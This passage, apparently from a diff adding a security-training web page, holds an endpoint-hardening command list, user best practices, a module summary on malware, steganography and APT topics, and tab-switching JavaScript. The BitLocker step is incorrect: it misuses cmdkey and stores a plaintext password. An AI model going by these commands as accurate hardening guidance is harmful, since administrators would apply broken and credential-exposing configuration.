+
+# Disable PowerShell Execution
+Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser
+
+# Enable Credential Guard (requires virtualization)
+powershell -Command "Enable-WindowsOptionalFeature -Online -FeatureName IsolatedUserMode"
+
+# Enable BitLocker
+cmdkey /add:BitLocker /target:C: /user:Administrator /pass:yourpassword
+manage-bde -on C:
+
+# Disable Macro Execution
+reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v "VBAWarnings" /t REG_DWORD /d 4
+
+# Remove Unnecessary Services
+sc stop "Bluetooth Support Service"
+sc config "Bluetooth Support Service" start=disabled</code></pre>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ BEST PRACTICES FOR USERS:</strong>
+                    <ul>
+                        <li>Never open suspicious email attachments</li>
+                        <li>Don't click links from unknown sources</li>
+                        <li>Keep operating system and software updated</li>
+                        <li>Use strong, unique passwords for each account</li>
+                        <li>Enable multi-factor authentication where possible</li>
+                        <li>Run antivirus/anti-malware regularly</li>
+                        <li>Backup critical data regularly (offline)</li>
+                        <li>Report suspicious emails to IT/security team</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 18: Module Summary -->
+            <section class="tab-content" id="tab18">
+                <h2>Module 7 Complete: Comprehensive Security Summary</h2>
+                <p class="subtitle">Review and assessment of enterprise security and malware knowledge</p>
+
+                <div class="summary-grid">
+                    <div class="summary-card">
+                        <h3>🏢 Active Directory</h3>
+                        <ul>
+                            <li>Centralized user management</li>
+                            <li>Domain authentication flow</li>
+                            <li>Group policy enforcement</li>
+                            <li>Kerberos protocol</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🖼️ Steganography</h3>
+                        <ul>
+                            <li>Steghide & OutGuess</li>
+                            <li>NTFS alternate streams</li>
+                            <li>White space encoding</li>
+                            <li>Image encoding/polyglots</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🦠 Malware Types</h3>
+                        <ul>
+                            <li>Viruses & Worms</li>
+                            <li>Trojans & RAT</li>
+                            <li>Ransomware mechanisms</li>
+                            <li>Spyware & Keyloggers</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>📤 Delivery Methods</h3>
+                        <ul>
+                            <li>Phishing campaigns</li>
+                            <li>USB/removable media</li>
+                            <li>Malicious websites</li>
+                            <li>Email attachments</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🎯 Advanced Threats</h3>
+                        <ul>
+                            <li>APT framework</li>
+                            <li>Zero-day exploits</li>
+                            <li>RAT capabilities</li>
+                            <li>C&C communication</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🛡️ Defense Layers</h3>
+                        <ul>
+                            <li>Prevention mechanisms</li>
+                            <li>Detection methods</li>
+                            <li>Incident response</li>
+                            <li>System hardening</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="achievement-box">
+                    <h3>🏆 Module 7 Mastery Achieved!</h3>
+                    <p>You've successfully completed comprehensive training on:</p>
+                    <ul>
+                        <li>✓ Active Directory architecture and security implications</li>
+                        <li>✓ Advanced steganography tools and techniques (Steghide, OutGuess, ADS)</li>
+                        <li>✓ White space encoding and covert data hiding methods</li>
+                        <li>✓ Malware classification and characteristics</li>
+                        <li>✓ Malware delivery vectors and attack chains</li>
+                        <li>✓ Trojans, RAT, and remote access capabilities</li>
+                        <li>✓ APT framework and advanced persistence techniques</li>
+                        <li>✓ Comprehensive defense-in-depth strategy</li>
+                        <li>✓ Endpoint hardening and detection methods</li>
+                    </ul>
+                    <p><strong>Next Steps:</strong> Module 8 - Privilege Escalation and System Exploitation!</p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Script -->
+    <script>
+        function switchTab(tabName) {
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            const selectedTab = document.getElementById(tabName);
+            if (selectedTab) {
+                selectedTab.classList.add('active');
+                updateBreadcrumb(tabName);
+                window.scrollTo(0, 0);
+            }
+        }
+
+        function updateBreadcrumb(tabName) {
+            const breadcrumbMap = {
+                'tab1': 'Overview', 'tab2': 'Domain Controllers', 'tab3': 'AD Architecture',
+                'tab4': 'Steghide Deep Dive', 'tab5': 'OutGuess Tool', 'tab6': 'NTFS ADS',
+                'tab7': 'White Space Stego', 'tab8': 'Image Encoding', 'tab9': 'Stego Detection',
+                'tab9b': 'Crypto Foundations', 'tab10': 'Malware Types', 'tab11': 'Delivery Methods', 
+                'tab12': 'Attack Vectors', 'tab13': 'Trojans & RAT', 'tab14': 'APT Framework', 
+                'tab14b': 'Kerberos Protocol', 'tab15': 'IoC & Detection', 'tab15b': 'APT Attack Chains',
+                'tab15c': 'Forensics & Analysis', 'tab16': 'Defense Strategy', 
+                'tab17': 'Endpoint Hardening', 'tab18': 'Summary & Quiz'
+            };
+            
+            const breadcrumbElement = document.getElementById('breadcrumb-current');
+            if (breadcrumbElement) {
+                breadcrumbElement.textContent = breadcrumbMap[tabName] || 'Content';
+            }
+        }
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleSimStep(element) {
+            const content = element.querySelector('.step-content');
+            const icon = element.querySelector('.toggle-icon');
+            
+            const container = element.closest('.scenario-card') || element.closest('.simulation-box');
+            if (container) {
+                const otherSteps = container.querySelectorAll('.sim-step');
+                otherSteps.forEach(step => {
+                    if (step !== element) {
+                        const stepContent = step.querySelector('.step-content');
+                        const stepIcon = step.querySelector('.toggle-icon');
+                        if (stepContent) {
+                            stepContent.classList.remove('active');
+                            stepContent.style.display = 'none';
+                        }
+                        if (stepIcon) {
+                            stepIcon.style.transform = 'rotate(0deg)';
+                        }
+                    }
+                });
+            }
+            
+            if (content) {
+                content.classList.toggle('active');
+                content.style.display = content.classList.contains('active') ? 'block' : 'none';
+            }
+            
+            if (icon) {
+                icon.style.transform = content && content.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)';
+            }
+        }
+
+        function toggleAttackDetails(element) {
+            const details = element.querySelector('.attack-details');
+            if (details) {
+                details.style.display = details.style.display === 'none' ? 'block' : 'none';
+            }
+        }
+
+        window.addEventListener('load', () => switchTab('tab1'));
+    </script>
+</body>
+</html>
